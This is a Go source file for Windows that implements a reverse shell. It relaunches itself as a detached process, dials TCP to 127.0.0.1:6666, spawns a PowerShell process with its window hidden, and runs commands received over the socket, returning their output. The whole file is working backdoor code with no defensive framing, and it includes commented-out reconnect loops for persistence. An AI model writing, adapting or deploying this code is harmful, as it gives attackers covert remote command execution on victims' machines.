//go:build windows
// +build windows

package main

import (
	"bufio"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	//"time"
)

const daemonFlag = "-daemon"

func main() {
	if len(os.Args) > 1 && os.Args[1] == daemonFlag {
		// This is the child process, which will run the reverse function
		reverse("127.0.0.1:6666")
	} else {
		// This is the parent process
		startUnattachedProcess()
	}
}

func startUnattachedProcess() {
	cmd := exec.Command(os.Args[0], daemonFlag)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		// Create a new process group
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	err := cmd.Start()
	if err != nil {
		panic(err)
	}
	// Parent process exits immediately
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		// If there's an error connecting, just return and terminate the function
		// Uncomment the following lines if you want the function to retry connecting after waiting for a minute
		// time.Sleep(time.Minute)
		// reverse(host)
		return
	}
	defer c.Close() // Ensure the connection closes when the function returns

	// Initialize a single PowerShell process and set up pipes
	cmd := exec.Command("powershell")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()
	cmd.Start()

	go func() {
		// Read from stdout and send it back to the connection
		buffer := make([]byte, 1024)
		for {
			bytesRead, err := stdout.Read(buffer)
			if err != nil {
				break
			}
			c.Write(buffer[:bytesRead])
		}
	}()

	go func() {
		// Read from stderr and send it back to the connection
		buffer := make([]byte, 1024)
		for {
			bytesRead, err := stderr.Read(buffer)
			if err != nil {
				break
			}
			c.Write(buffer[:bytesRead])
		}
	}()

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if err != nil {
			// If there's an error reading from the connection, close all pipes and terminate the function
			stdin.Close()
			stdout.Close()
			stderr.Close()
			cmd.Wait() // Ensure the PowerShell process finishes
			// Uncomment the following lines if you want the function to retry connecting after a disconnect
			// time.Sleep(time.Minute)
			// reverse(host)
			return
		}

		// Send the received order to the persistent PowerShell process, trimming the newline character first
		stdin.Write([]byte(strings.TrimRight(order, "\r\n") + "\n"))
	}
}
